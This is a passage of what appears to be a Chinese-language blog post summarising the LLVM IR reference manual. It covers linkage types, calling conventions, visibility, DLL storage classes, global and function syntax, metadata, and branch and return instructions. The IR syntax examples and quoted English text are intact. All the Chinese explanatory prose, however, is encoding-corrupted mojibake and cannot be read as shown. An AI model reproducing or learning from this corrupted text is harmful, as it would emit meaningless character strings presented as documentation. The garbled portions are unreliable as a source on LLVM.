‡æ–‡ä»¶ä¸­ã€‚ç±»ä¼¼Cè¯­è¨€ä¸­staticçš„æ¦‚å¿µã€‚</p></li><li><p><code>available_externally</code></p><p>è¯¥ç±»å‹çš„å˜é‡ä¸ä¼šè¢«è¾“å‡ºåˆ°å¯¹åº”æ¨¡å—çš„ç›®æ ‡æ–‡ä»¶ä¸­ã€‚å¯¹äºé“¾æ¥è€…æ¥è¯´ï¼Œè¯¥ç±»å‹ç›¸å½“äºä¸€ä¸ªå¤–éƒ¨å£°æ˜ã€‚è¿™ç§ç±»å‹åªå…è®¸åœ¨å®šä¹‰æ—¶ä½¿ç”¨ï¼Œè€Œä¸èƒ½åœ¨å£°æ˜æ—¶ä½¿ç”¨ã€‚</p></li><li><p><code>linkonce</code></p><p>é“¾æ¥æ—¶ï¼Œè¿™ç§ç±»å‹çš„å˜é‡ä¼šå’Œå…¶ä»–åŒåå˜é‡mergeã€‚è¯¥ç±»å‹çš„å˜é‡å¦‚æœæ²¡è¢«ä½¿ç”¨åˆ™å¯ä»¥è¢«ä¸¢å¼ƒã€‚è¿™ç§ç±»å‹çš„å‡½æ•°ä¸å…è®¸ä¼˜åŒ–å™¨å°†å…¶å†…è”åˆ°è°ƒç”¨è€…çš„å‡½æ•°ä½“ä¸­ï¼Œè¿™ä¸ªå®ƒæœ‰å¯èƒ½è¢«é‡å†™ã€‚å¦‚æœæƒ³å…è®¸å†…è”æˆ–è€…å…¶ä»–ä¼˜åŒ–ï¼Œè¯·ä½¿ç”¨<code>linkonce_odr</code>ç±»å‹</p></li><li><p><code>weak</code></p><p>ä¸<code>linkonce</code>ç±»ä¼¼ï¼Œä½†å³ä½¿ä¸è¢«ä½¿ç”¨ï¼Œä¹Ÿä¸èƒ½ä¸¢å¼ƒã€‚ç±»ä¼¼Cè¯­è¨€ä¸­çš„<code>weak</code>ç±»å‹çš„å˜é‡ï¼ˆå¤šä¸ªå˜é‡æ‹¥æœ‰ç›¸åŒçš„åå­—ä¸ä¼šé€ æˆå†²çªï¼Œåªè¦å…¶ä¸­ä¸€ä¸ªæ˜¯weakç±»å‹çš„ã€‚é“¾æ¥æ—¶ï¼Œweakç±»å‹çš„å®šä¹‰è¢«å¿½ç•¥è€Œä½¿ç”¨æ­£å¸¸çš„å®šä¹‰ï¼Œå¦‚æœæ²¡æœ‰æ­£å¸¸çš„å®šä¹‰ï¼Œåˆ™ä½¿ç”¨weakçš„å®šä¹‰ï¼‰ã€‚</p></li><li><p><code>common</code></p><p>ä¸weakç±»ä¼¼ï¼Œç”¨äºCè¯­è¨€ä¸­çš„ä¸´æ—¶å®šä¹‰ï¼Œæ¯”å¦‚å…¨å±€ä½œç”¨åŸŸä¸­çš„`int x;â€ã€‚å‡½æ•°å’Œåˆ«åæ²¡æœ‰commonç±»å‹</p></li><li><p><code>appending</code></p><p>åªç”¨äºæ•°ç»„ç±»å‹çš„æŒ‡é’ˆã€‚ä¸¤ä¸ªè¿™ç§ç±»å‹çš„å˜é‡é“¾æ¥æ—¶ï¼Œå¯¹åº”çš„å…¨å±€æ•°ç»„è¢«è¿æ¥åœ¨ä¸€èµ·ã€‚</p><p>åªèƒ½ç”¨äºLLVM.GLOBAL_CTORSç­‰å˜é‡</p></li><li><p><code>extern_weak</code></p><p>è¿™ç§ç±»å‹åœ¨é“¾æ¥ä¹‹å‰æ˜¯weakçš„ï¼Œå¦‚æœä¸è¢«é“¾æ¥ï¼Œè¿™ä¸ªå˜é‡æ˜¯nullè€Œä¸æ˜¯undefined referenceã€‚</p></li><li><p><code>linkonce_odr, weak_odrã€‚ODRï¼ˆone definition ruleï¼‰</code></p><p>åªæœ‰ç­‰æ•ˆçš„å˜é‡æ‰èƒ½è¢«mergeã€‚è¿™ä¸ªé“¾æ¥ç±»å‹å°±è¡¨ç¤ºåªèƒ½è·Ÿç­‰æ•ˆçš„å˜é‡åˆå¹¶ã€‚</p></li><li><p><code>external</code></p><p>å¦‚æœæ²¡æœ‰æŒ‡å®šä¸Šé¢çš„ä»»æ„ç±»å‹ï¼Œé‚£ä¹ˆå°±æ˜¯externalçš„,</p></li></ul><p><font color='red'>å‡½æ•°å£°æ˜åªèƒ½ä½¿ç”¨<code> external</code> æˆ– <code>extern_weak </code></font></p><h3 id="è°ƒç”¨çº¦å®š-Calling-Conventions">è°ƒç”¨çº¦å®š(<a href="https://llvm.org/docs/LangRef.html#id1540">Calling Conventions</a>)</h3><p>LLVM æ”¯æŒè°ƒç”¨çº¦å®šå¦‚ä¸‹</p><ul><li><p>â€œ<code>ccc</code>â€ - Cè°ƒç”¨çº¦å®š</p><p>å¦‚æœæ²¡æœ‰æŒ‡å®šå…¶ä»–ç±»å‹ï¼Œé‚£ä¹ˆå°±é»˜è®¤æ˜¯è¿™ç§ç±»å‹,</p><p>è¿™ä¸ªç±»å‹æ”¯æŒå¯å˜å‚æ•°çš„å‡½æ•°è°ƒç”¨å¹¶ä¸”å…è®¸å£°æ˜çš„åŸå‹å’Œå‡½æ•°å£°æ˜çš„å®ç°ä¹‹é—´æœ‰ä¸€äº›ä¸åŒ¹é…ã€‚</p></li><li><p>â€œ<code>fastcc</code>â€ - å¿«é€Ÿè°ƒç”¨çº¦å®š</p><p>ä½¿ç”Ÿæˆçš„ç›®æ ‡ä»£ç å°½å¯èƒ½å¿«ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„tricksã€‚ä¸æ”¯æŒå¯å˜å‚æ•°ï¼Œå¹¶ä¸”åŸå‹å’Œå®ç°è¦ä¸¥æ ¼åŒ¹é…ã€‚</p></li><li><p>â€œ<code>coldcc</code>â€ - å†·è°ƒç”¨</p><p>å‡å®šè¿™ç§è°ƒç”¨ä¸ç»å¸¸å‘ç”Ÿã€‚ä¸æ”¯æŒå¯å˜å‚æ•°ï¼Œå¹¶ä¸”åŸå‹å’Œå®ç°è¦ä¸¥æ ¼åŒ¹é…</p></li><li><p>â€œ<code>cc 10</code>â€ - GHCè°ƒç”¨</p><p><a href="http://www.haskell.org/ghc">Glasgow Haskell Compiler (GHC)</a>.ä¸“ç”¨ï¼Œ</p></li><li><p>â€œ<code>cc 11</code>â€ - HiPE è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>webkit_jscc</code>â€ - WebKit çš„ JavaScript è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>anyregcc</code>â€ - ä»£ç ä¿®è¡¥çš„åŠ¨æ€è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>preserve_mostcc</code>â€ - PreserveMost è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>preserve_allcc</code>â€ - PreserveAll è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>cxx_fast_tlscc</code>â€ - è®¿é—®å‡½æ•°çš„ CXX_FAST_TLS è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>tailcc</code>â€ - å°¾å¯è°ƒç”¨è°ƒç”¨çº¦å®š</p></li><li><p>â€œ<code>swiftcc</code>â€ - æ­¤è°ƒç”¨çº¦å®šç”¨äº Swift è¯­è¨€ã€‚</p></li><li><p>â€œ<code>swifttailcc</code>â€</p></li><li><p>â€œ<code>cfguard_checkcc</code>â€ - Windows Control Flow Guardï¼ˆæ£€æŸ¥æœºåˆ¶ï¼‰</p></li><li><p>â€œ<code>cc &lt;n&gt;</code>â€ - ç¼–å·çº¦å®š</p></li></ul><h3 id="å¯è§æ ¼å¼-Visibility-Styles">å¯è§æ ¼å¼(<a href="https://llvm.org/docs/LangRef.html#id1541">Visibility Styles</a>)</h3><p>æ‰€æœ‰çš„å…¨å±€å˜é‡å’Œå‡½æ•°éƒ½æœ‰ä»¥ä¸‹å¯è§æ€§æ ·å¼ä¹‹ä¸€</p><ul><li><p>â€œ<code>default</code>â€ - é»˜è®¤æ ¼å¼</p><p>å¯¹äºä½¿ç”¨ELFï¼ˆExecutable and Linking Formatï¼‰æ ¼å¼çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ç§å¯è§æ€§æ ·å¼æ„å‘³ç€å£°æ˜å¯¹å…¶ä»–æ¨¡å—å¯è§ï¼›åœ¨å…±äº«åº“ä¸­ï¼Œæ„å‘³ç€å£°æ˜çš„å®ä½“å¯ä»¥è¢«é‡å†™ï¼›åœ¨Darwinï¼Œå£°æ˜å¯¹å…¶ä»–æ¨¡å—å¯è§ã€‚</p></li><li><p>â€œ<code>hidden</code>â€ - Hidden style</p><p>å…·æœ‰è¿™ç§å¯è§æ€§æ ·å¼çš„å£°æ˜å¼•ç”¨ç›¸åŒçš„å¯¹è±¡ï¼Œå¦‚æœå®ƒä»¬åœ¨ç›¸åŒçš„å…±äº«å¯¹è±¡ä¸­çš„è¯ã€‚é€šå¸¸ï¼Œå…·æœ‰è¿™ç§å¯è§æ€§æ ·å¼çš„ç¬¦å·ä¸ä¼šå‡ºç°åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­ï¼Œæ‰€æœ‰å…¶ä»–æ¨¡å—ä¸èƒ½ç›´æ¥å¼•ç”¨å®ƒã€‚</p></li><li><p>â€œ<code>protected</code>â€ - Protected style</p><p>å¯¹äºELFï¼Œè¿™ç§æ ·å¼è¡¨æ˜ç¬¦å·ä¼šæ”¾ç½®åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­ï¼Œä½†æ˜¯åœ¨å®šä¹‰è¿™ä¸ªç¬¦å·çš„æ¨¡å—ä¸­çš„å¼•ç”¨ä¼šç»‘å®šåˆ°å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç¬¦å·ä¸èƒ½è¢«å…¶ä»–æ¨¡å—é‡å†™ã€‚</p></li></ul><p>å…·æœ‰<code>å†…éƒ¨(internal)</code>æˆ–<code>ç§æœ‰(private)</code>é“¾æ¥çš„ç¬¦å·å¿…é¡»å…·æœ‰<code>é»˜è®¤(default)</code>å¯è§æ€§ã€‚</p><h3 id="DLLå­˜å‚¨ç±»-DLL-Storage-Classes">DLLå­˜å‚¨ç±»(<a href="https://llvm.org/docs/LangRef.html#id1542">DLL Storage Classes</a>)</h3><p>æ‰€æœ‰å…¨å±€å˜é‡ï¼Œå‡½æ•°å’Œåˆ«åå¯ä»¥æœ‰ä»¥ä¸‹DLLå­˜å‚¨ç±»ä¹‹ä¸€</p><ul><li><p>dllimport</p><p>â€œ<code>dllimport</code>â€ä½¿ç¼–è¯‘å™¨é€šè¿‡ä¸€ä¸ªå…¨å±€æŒ‡é’ˆå¼•ç”¨å‡½æ•°æˆ–å˜é‡ï¼Œè¯¥æŒ‡é’ˆæ˜¯ç”±å¯¼å‡ºç¬¦å·çš„DLLè®¾ç½®çš„ã€‚åœ¨Microsoft Windowsç›®æ ‡ä¸Šï¼ŒæŒ‡é’ˆåç§°ç”±impå’Œå‡½æ•°æˆ–å˜é‡åç§°ç»„åˆè€Œæˆã€‚</p></li><li><p>dllexport</p><p>dllexportä½¿ç¼–è¯‘å™¨æä¾›ä¸€ä¸ªæŒ‡å‘DLLä¸­çš„æŒ‡é’ˆçš„å…¨å±€æŒ‡é’ˆï¼Œè¿™æ ·å®ƒå°±å¯ä»¥è¢«dllimportå±æ€§å¼•ç”¨ã€‚ åœ¨Microsoft Windowsç›®æ ‡ä¸Šï¼ŒæŒ‡é’ˆåç§°ç”±impå’Œå‡½æ•°æˆ–å˜é‡åç§°ç»„åˆè€Œæˆã€‚å› ä¸ºè¿™ä¸ªå­˜å‚¨ç±»æ˜¯ç”¨æ¥å®šä¹‰dllæ¥å£çš„ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨çŸ¥é“å®ƒæ˜¯å¤–éƒ¨å¼•ç”¨çš„ï¼Œæ‰€ä»¥å¿…é¡»é¿å…åˆ é™¤è¯¥ç¬¦å·ã€‚</p></li></ul><h3 id="å…¨å±€å˜é‡-Global-Variables">å…¨å±€å˜é‡(<a href="https://llvm.org/docs/LangRef.html#id1547">Global Variables</a>)</h3><ul><li>å…¨å±€å˜é‡å®šä¹‰åœ¨ç¼–è¯‘æ—¶é—´åˆ†é…çš„å†…å­˜åŒºåŸŸè€Œéè¿è¡Œæ—¶</li><li>å…¨å±€å˜é‡å®šä¹‰å¿…é¡»åˆå§‹åŒ–</li><li>å…¶ä»–ç¿»è¯‘å•å…ƒä¸­çš„å…¨å±€å˜é‡ä¹Ÿå¯ä»¥å£°æ˜ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å®ƒä»¬æ²¡æœ‰åˆå§‹åŒ–å™¨ã€‚</li><li>å…¨å±€å˜é‡å¯ä»¥é€‰æ‹©æŒ‡å®šé“¾æ¥ç±»å‹</li><li>å˜é‡å¯ä»¥å®šä¹‰ä¸ºå…¨å±€å¸¸é‡ï¼Œè¿™è¡¨æ˜å˜é‡çš„å†…å®¹æ°¸è¿œä¸ä¼šè¢«ä¿®æ”¹ï¼Œä½†éœ€è¦è¿è¡Œæ—¶åˆå§‹åŒ–çš„å˜é‡ä¸èƒ½æ ‡è®°ä¸ºå¸¸é‡ï¼Œå› ä¸ºå˜é‡æœ‰å­˜å‚¨ã€‚</li></ul><p><strong>è¯­æ³•</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">@<span class="token operator">&lt;</span>GlobalVarName<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">[</span>Linkage<span class="token punctuation">]</span> <span class="token punctuation">[</span>PreemptionSpecifier<span class="token punctuation">]</span> <span class="token punctuation">[</span>Visibility<span class="token punctuation">]</span>                   <span class="token punctuation">[</span>DLLStorageClass<span class="token punctuation">]</span> <span class="token punctuation">[</span>ThreadLocal<span class="token punctuation">]</span>                   <span class="token punctuation">[</span><span class="token punctuation">(</span>unnamed_addr<span class="token operator">|</span>local_unnamed_addr<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>AddrSpace<span class="token punctuation">]</span>                   <span class="token punctuation">[</span>ExternallyInitialized<span class="token punctuation">]</span>                   <span class="token operator">&lt;</span>global <span class="token operator">|</span> constant<span class="token operator">></span> <span class="token operator">&lt;</span>Type<span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>InitializerConstant<span class="token operator">></span><span class="token punctuation">]</span>                   <span class="token punctuation">[</span><span class="token punctuation">,</span> section <span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> partition <span class="token string">"name"</span><span class="token punctuation">]</span>                   <span class="token punctuation">[</span><span class="token punctuation">,</span> comdat <span class="token punctuation">[</span><span class="token punctuation">(</span>$name<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> align <span class="token operator">&lt;</span>Alignment<span class="token operator">></span><span class="token punctuation">]</span>                   <span class="token punctuation">(</span><span class="token punctuation">,</span> <span class="token operator">!</span>name <span class="token operator">!</span>N<span class="token punctuation">)</span><span class="token operator">*</span></code></pre><h3 id="å‡½æ•°-Functions">å‡½æ•°(<a href="https://llvm.org/docs/LangRef.html#id1548">Functions</a>)</h3><p>LLVMå‡½æ•°å®šä¹‰ç”±<code>define</code>å…³é”®å­—ç»„æˆ</p><blockquote><p>an optional <a href="https://llvm.org/docs/LangRef.html#linkage">linkage type</a>, an optional <a href="https://llvm.org/docs/LangRef.html#runtime-preemption-model">runtime preemption specifier</a>, an optional <a href="https://llvm.org/docs/BitCodeFormat.html#visibility">visibility style</a>, an optional <a href="https://llvm.org/docs/LangRef.html#dllstorageclass">DLL storage class</a>, an optional <a href="https://llvm.org/docs/LangRef.html#callingconv">calling convention</a>, an optional <code>unnamed_addr</code> attribute, a return type, an optional <a href="https://llvm.org/docs/LangRef.html#paramattrs">parameter attribute</a> for the return type, a function name, a (possibly empty) argument list (each with optional <a href="https://llvm.org/docs/LangRef.html#paramattrs">parameter attributes</a>), optional <a href="https://llvm.org/docs/LangRef.html#fnattrs">function attributes</a>, an optional address space, an optional section, an optional alignment, an optional <a href="https://llvm.org/docs/LangRef.html#langref-comdats">comdat</a>, an optional <a href="https://llvm.org/docs/LangRef.html#gc">garbage collector name</a>, an optional <a href="https://llvm.org/docs/LangRef.html#prefixdata">prefix</a>, an optional <a href="https://llvm.org/docs/LangRef.html#prologuedata">prologue</a>, an optional <a href="https://llvm.org/docs/LangRef.html#personalityfn">personality</a>, an optional list of attached <a href="https://llvm.org/docs/LangRef.html#metadata">metadata</a>, an opening curly brace, a list of basic blocks, and a closing curly brace.</p></blockquote><p>LLVMå‡½æ•°å£°æ˜ç”±<code>declare</code>å…³é”®å­—ç»„æˆ</p><blockquote><p>an optional <a href="https://llvm.org/docs/LangRef.html#linkage">linkage type</a>, an optional <a href="https://llvm.org/docs/BitCodeFormat.html#visibility">visibility style</a>, an optional <a href="https://llvm.org/docs/LangRef.html#dllstorageclass">DLL storage class</a>, an optional <a href="https://llvm.org/docs/LangRef.html#callingconv">calling convention</a>, an optional <code>unnamed_addr</code> or <code>local_unnamed_addr</code> attribute, an optional address space, a return type, an optional <a href="https://llvm.org/docs/LangRef.html#paramattrs">parameter attribute</a> for the return type, a function name, a possibly empty list of arguments, an optional alignment, an optional <a href="https://llvm.org/docs/LangRef.html#gc">garbage collector name</a>, an optional <a href="https://llvm.org/docs/LangRef.html#prefixdata">prefix</a>, and an optional <a href="https://llvm.org/docs/LangRef.html#prologuedata">prologue</a>.</p></blockquote><ul><li>å¦‚æœç»™å‡ºäº†<code>Unnamed_addr</code>å±æ€§ï¼Œåˆ™å·²çŸ¥åœ°å€ä¸æ˜¯å¾ˆå¤§ï¼Œå¹¶ä¸”å¯ä»¥åˆå¹¶ä¸¤ä¸ªç›¸åŒçš„åŠŸèƒ½ã€‚</li><li>å¦‚æœç»™å‡ºäº†<code>local_unnamed_addr</code>å±æ€§ï¼Œåˆ™å·²çŸ¥åœ°å€åœ¨æ¨¡å—ä¸­ä¸æ˜¾ç€ã€‚</li><li>å¦‚æœæœªç»™å‡ºæ˜¾å¼åœ°å€ç©ºé—´ï¼Œåˆ™å°†é»˜è®¤ä¸ºDataLayOutå­—ç¬¦ä¸²çš„ç¨‹åºåœ°å€ç©ºé—´é»˜è®¤ã€‚</li></ul><p><strong>è¯­æ³•</strong></p><pre class="language-none"><code class="language-none">define [linkage] [PreemptionSpecifier] [visibility] [DLLStorageClass]       [cconv] [ret attrs]       &lt;ResultType&gt; @&lt;FunctionName&gt; ([argument list])       [(unnamed_addr|local_unnamed_addr)] [AddrSpace] [fn Attrs]       [section &quot;name&quot;] [partition &quot;name&quot;] [comdat [($name)]] [align N]       [gc] [prefix Constant] [prologue Constant] [personality Constant]       (!name !N)* &#123; ... &#125;</code></pre><p>å‚æ•°åˆ—è¡¨<code>(argument list)</code>æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å‚æ•°åºåˆ—ï¼Œå…¶ä¸­æ¯ä¸ªå‚æ•°çš„å½¢å¼å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">&lt;type&gt; [parameter Attrs] [name]</code></pre><h3 id="Metadata-Metadata">Metadata(<a href="https://llvm.org/docs/LangRef.html#id1624">Metadata</a>)</h3><p>LLVM IRå…è®¸å…ƒæ•°æ®é™„åŠ åˆ°ç¨‹åºä¸­çš„æŒ‡ä»¤å’Œå…¨å±€å¯¹è±¡ï¼Œè¯¥ç¨‹åºå¯ä»¥å°†å…³äºä»£ç çš„é¢å¤–ä¿¡æ¯ä¼ è¾¾ç»™ä¼˜åŒ–å™¨å’Œä»£ç ç”Ÿæˆå™¨ã€‚</p><p><font color='cornflowerblue'>å…ƒæ•°æ®æ²¡æœ‰ç±»å‹ï¼Œä¹Ÿä¸æ˜¯å€¼ã€‚å¦‚æœä»è°ƒç”¨æŒ‡ä»¤ä¸­å¼•ç”¨ï¼Œåˆ™ä½¿ç”¨å…ƒæ•°æ®ç±»å‹ã€‚</font></p><p><font color='red'>æ‰€æœ‰å…ƒæ•°æ®åœ¨è¯­æ³•ä¸­éƒ½ç”±æ„Ÿå¹å·(!)æ ‡è¯†ï¼</font></p><h3 id="Named-Metadata-Named-Metadata">Named Metadata(<a href="https://llvm.org/docs/LangRef.html#id1552">Named Metadata</a>)</h3><p>å‘½åå…ƒæ•°æ®æ˜¯å…ƒæ•°æ®çš„é›†åˆ,å…ƒæ•°æ®èŠ‚ç‚¹(<a href="https://llvm.org/docs/LangRef.html#metadata">Metadata nodes</a>,ä½†ä¸æ˜¯å…ƒæ•°æ®å­—ç¬¦ä¸²)æ˜¯å·²å‘½åå…ƒæ•°æ®çš„å”¯ä¸€æœ‰æ•ˆæ“ä½œæ•°</p><p>å‘½åå…ƒæ•°æ®è¡¨ç¤ºä¸ºå¸¦æœ‰å…ƒæ•°æ®å‰ç¼€çš„å­—ç¬¦ä¸²ã€‚å…ƒæ•°æ®åç§°çš„è§„åˆ™ä¸æ ‡è¯†ç¬¦ç›¸åŒï¼Œä½†ä¸å…è®¸ä½¿ç”¨å¸¦å¼•å·çš„åç§°ã€‚<code>&quot;\xx&quot;</code>ç±»å‹è½¬ä¹‰ä»ç„¶æœ‰æ•ˆï¼Œå®ƒå…è®¸ä»»ä½•å­—ç¬¦æˆä¸ºåç§°çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>è¯­æ³•</strong></p><pre class="language-none"><code class="language-none">; Some unnamed metadata nodes, which are referenced by the named metadata.!0 &#x3D; !&#123;!&quot;zero&quot;&#125;!1 &#x3D; !&#123;!&quot;one&quot;&#125;!2 &#x3D; !&#123;!&quot;two&quot;&#125;; A named metadata.!name &#x3D; !&#123;!0, !1, !2&#125;</code></pre><h3 id="æ§åˆ¶æŒ‡ä»¤å«ä¹‰-Terminator-Instructions">æ§åˆ¶æŒ‡ä»¤å«ä¹‰(<a href="https://llvm.org/docs/LangRef.html#id1743">Terminator Instructions</a>)</h3><h4 id="ret-è¿”å›">ret  è¿”å›</h4><p>è¿”å›</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">ret &lt;type&gt; &lt;value&gt;       ; Return a value from a non-void functionret void                 ; Return from void function</code></pre><p><strong>Semantics:</strong></p><p>å½“æ‰§è¡Œâ€˜<code>ret</code>â€™ æŒ‡ä»¤æ—¶, æ§åˆ¶æµè¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ã€‚</p><ul><li>å¦‚æœè°ƒç”¨è€…æ˜¯â€œ<a href="https://llvm.org/docs/LangRef.html#i-call">call</a>â€æŒ‡ä»¤ï¼Œåˆ™åœ¨è°ƒç”¨åçš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚</li><li>å¦‚æœè°ƒç”¨è€…æ˜¯â€œ<a href="https://llvm.org/docs/LangRef.html#i-invoke">invoke</a>â€æŒ‡ä»¤ï¼Œåˆ™åœ¨â€œæ­£å¸¸â€ç›®æ ‡å—çš„å¼€å¤´ç»§ç»­æ‰§è¡Œã€‚</li><li>å¦‚æœæŒ‡ä»¤è¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼åº”è®¾ç½®è°ƒç”¨æˆ–è°ƒç”¨æŒ‡ä»¤çš„è¿”å›å€¼ã€‚</li></ul><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">ret i32 5                       ; Return an integer value of 5ret void                        ; Return from a void functionret &#123; i32, i8 &#125; &#123; i32 4, i8 2 &#125; ; Return a struct of values 4 and 2</code></pre><h4 id="br-åˆ†æ”¯"><a href="https://llvm.org/docs/LangRef.html#id1750">br åˆ†æ”¯ </a></h4><p>äºŒå…ƒæœ‰æ¡ä»¶åˆ†æ”¯å’Œæ— æ¡ä»¶åˆ†æ”¯ã€‚</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt;br label &lt;dest&gt;          ; Unconditional branch</code></pre><p><strong>Semantics:</strong></p><p>åœ¨æ‰§è¡Œæ¡ä»¶<code>br</code>æŒ‡ä»¤æ—¶ï¼Œä¼šè¯„ä¼°<code>i1</code>å‚æ•°ã€‚ å¦‚æœå€¼ä¸º <code>true</code>ï¼Œåˆ™æ§åˆ¶æµå‘ ``iftrue<code>' </code>label<code> å‚æ•°ã€‚ å¦‚æœ</code>cond<code>ä¸º</code>false<code>ï¼Œåˆ™æ§åˆ¶æµå‘</code>iffalse<code>,</code>label`å‚æ•°ã€‚</p><p>å¦‚æœ<code>cond</code>æ˜¯<code>poison</code>æˆ–<code>undef</code>ï¼Œåˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">Test:  %cond &#x3D; icmp eq i32 %a, %b  br i1 %cond, label %IfEqual, label %IfUnequalIfEqual:  ret i32 1IfUnequal:  ret i32 0</code></pre><h4 id="switch-å¤šæ¡ä»¶åˆ†æ”¯">switch  å¤šæ¡ä»¶åˆ†æ”¯</h4><p>å¤šæ¡ä»¶åˆ†æ”¯</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ... ]</code></pre><p><strong>Arguments:</strong></p><p>â€œ<code>switch</code>â€æŒ‡ä»¤ä½¿ç”¨ä¸‰ä¸ªå‚æ•°ï¼šä¸€ä¸ªæ•´æ•°æ¯”è¾ƒå€¼â€œ<code>value</code>â€ï¼Œä¸€ä¸ªé»˜è®¤çš„â€œ<code>label</code>â€ç›®çš„åœ°ï¼Œä»¥åŠä¸€ä¸ªç”±æˆå¯¹çš„æ¯”è¾ƒå€¼å¸¸é‡å’Œâ€œlabelâ€ç»„æˆçš„æ•°ç»„ã€‚<font color='red'> è¯¥è¡¨ä¸å…è®¸åŒ…å«é‡å¤çš„å¸¸é‡æ¡ç›®ã€‚</font></p><p><strong>Semantics:</strong></p><p><code>switch</code> æŒ‡ä»¤æŒ‡å®šäº†ä¸€ä¸ªå€¼å’Œç›®æ ‡è¡¨ã€‚ å½“æ‰§è¡Œâ€™<code>switch</code>â€™æŒ‡ä»¤æ—¶ï¼Œå°†åœ¨è¯¥è¡¨ä¸­æœç´¢ç»™å®šå€¼ã€‚</p><ul><li>å¦‚æœæ‰¾åˆ°è¯¥å€¼ï¼Œåˆ™å°†æ§åˆ¶æµè½¬ç§»åˆ°ç›¸åº”çš„ç›®çš„åœ°ï¼› å¦åˆ™ï¼Œæ§åˆ¶æµå°†è½¬ç§»åˆ°é»˜è®¤ç›®çš„åœ°ã€‚</li><li>å¦‚æœâ€œ<code>value</code>â€æ˜¯â€œ<code>poison</code>â€æˆ–â€œ<code>undef</code>â€ï¼Œåˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚</li></ul><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">; Emulate a conditional br instruction%Val &#x3D; zext i1 %value to i32switch i32 %Val, label %truedest [ i32 0, label %falsedest ]; Emulate an unconditional br instructionswitch i32 0, label %dest [ ]; Implement a jump table:switch i32 %val, label %otherwise [ i32 0, label %onzero                                    i32 1, label %onone                                    i32 2, label %ontwo ]</code></pre><h4 id="indirectbr-è½¬ç§»åˆ°æŒ‡å®šåœ°å€">indirectbr è½¬ç§»åˆ°æŒ‡å®šåœ°å€</h4><p>è½¬ç§»åˆ°åœ°å€å‚æ•°ä¸­æŒ‡å®šçš„å—</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">indirectbr &lt;somety&gt;* &lt;address&gt;, [ label &lt;dest1&gt;, label &lt;dest2&gt;, ... ]</code></pre><p><strong>Overview:</strong></p><p>â€œ<code>indirectbr</code>â€æŒ‡ä»¤å®ç°äº†åˆ°å½“å‰å‡½æ•°å†…æ ‡ç­¾çš„é—´æ¥åˆ†æ”¯ï¼Œå…¶åœ°å€ç”±â€œ<code>address</code>â€æŒ‡å®šã€‚</p><p>åœ°å€å¿…é¡»ä» <a href="https://llvm.org/docs/LangRef.html#blockaddress">blockaddress</a> å¸¸é‡æ´¾ç”Ÿã€‚</p><p><strong>Arguments:</strong></p><p>â€œ<code>åœ°å€</code>â€å‚æ•°æ˜¯è¦è·³è½¬åˆ°çš„æ ‡ç­¾çš„åœ°å€ã€‚ å…¶ä½™å‚æ•°è¡¨ç¤ºåœ°å€å¯èƒ½æŒ‡å‘çš„å…¨éƒ¨å¯èƒ½ç›®çš„åœ°ã€‚ å…è®¸åœ¨ç›®æ ‡åˆ—è¡¨ä¸­å¤šæ¬¡å‡ºç°å—ï¼Œä½†è¿™å¹¶ä¸æ˜¯ç‰¹åˆ«æœ‰ç”¨ã€‚</p><p>æ­¤ç›®æ ‡åˆ—è¡¨æ˜¯å¿…éœ€çš„ï¼Œä»¥ä¾¿æ•°æ®æµåˆ†æèƒ½å¤Ÿå‡†ç¡®äº†è§£ CFGã€‚</p><p><strong>Semantics:</strong></p><ul><li>æ§åˆ¶è½¬ç§»åˆ°åœ°å€å‚æ•°ä¸­æŒ‡å®šçš„å—ã€‚ <font color='cornflowerblue'>æ‰€æœ‰å¯èƒ½çš„ç›®æ ‡å—å¿…é¡»åˆ—åœ¨æ ‡ç­¾åˆ—è¡¨ä¸­ï¼Œå¦åˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸º</font>ã€‚ è¿™æ„å‘³ç€è·³è½¬åˆ°å…¶ä»–å‡½æ•°ä¸­å®šä¹‰çš„æ 